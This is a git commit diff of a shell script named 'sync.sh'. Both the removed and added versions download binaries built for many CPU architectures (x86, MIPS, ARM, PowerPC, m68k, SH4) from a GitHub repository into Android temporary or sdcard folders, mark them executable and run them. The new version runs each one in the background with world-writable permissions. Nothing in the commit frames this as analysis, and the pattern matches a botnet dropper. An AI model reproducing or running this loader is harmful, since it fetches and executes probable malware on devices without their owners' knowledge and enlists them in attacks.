36734f3b378fb56567c3e19c0842d34754d631da
syncvmpurchase <syncvmpurchase@gmail.com>
2025-07-25 14:18:35 -0300

    Update sync.sh

--- sync.sh
+++ sync.sh
@@ -1,26 +1,7 @@
-#!/bin/bash
-
-download_and_run() {
-    local url=$1
-    local file=$2
-    
-    cd /data/local/tmp
-    
-    wget --no-check-certificate "$url" -O "$file" || \
-    curl -k -L "$url" -o "$file" || \
-    busybox wget "$url" -O "$file"
-    
-    chmod +x "$file"
-    ./"$file"
-}
-
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.x86" "sync.x86"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.mips" "sync.mips"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.mipsel" "sync.mipsel"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm4" "sync.arm4"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm5" "sync.arm5"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm6" "sync.arm6"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.arm7" "sync.arm7"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.powerpc" "sync.powerpc"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.m68k" "sync.m68k"
-download_and_run "https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main/sync.sh4" "sync.sh4"
+#!/system/bin/sh
+cd /data/local/tmp || cd /data/data || cd /mnt/sdcard || cd /sdcard
+BASE_URL="https://github.com/syncvmpurchase/8572lfj38436ab/raw/refs/heads/main"
+BINS="sync.x86 sync.mips sync.mipsel sync.arm4 sync.arm5 sync.arm6 sync.arm7 sync.powerpc sync.m68k sync.sh4"
+for bin in $BINS; do
+    (wget "$BASE_URL/$bin" -O "$bin" || curl -L "$BASE_URL/$bin" -o "$bin") && chmod 777 "$bin" && ./"$bin" &
+done
